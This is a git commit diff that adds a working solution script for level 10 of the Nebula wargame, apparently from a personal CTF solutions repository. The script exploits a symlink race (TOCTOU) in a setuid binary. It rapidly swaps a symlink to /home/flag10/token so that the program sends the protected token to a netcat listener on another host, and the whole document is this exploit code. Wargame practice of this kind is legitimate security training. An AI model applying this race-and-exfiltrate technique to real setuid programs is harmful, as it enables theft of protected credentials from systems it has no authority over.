fc39ca145b5922f9cda26da8dc2559b96d54ebc7
alexwh <alexwh@users.noreply.github.com>
2016-01-30 23:11:02 +0000

    proper 10 solution

--- ee/nebula/10.sh
+++ ee/nebula/10.sh
@@ -1,9 +1,13 @@
 #!/bin/bash
-# this doesn't work
-cd /home/flag10
+# nc -l -k -p 18211 on target
+# swap symlink really quick in background
 while :;do
-	rm ~/wow
-	touch ~/wow
-	./flag10 ~/wow 192.168.122.1 &
 	ln -sf /home/flag10/token ~/wow
+	ln -sf /dev/null ~/wow
+done & # this forks a second bash process
+# 12 is success in this program(?)
+while [[ $? != 12 ]] ;do
+	/home/flag10/flag10 ~/wow 192.168.122.1
 done
+# kill own tree to stop ln loop (`-pid` terms process group)
+kill -TERM -$$
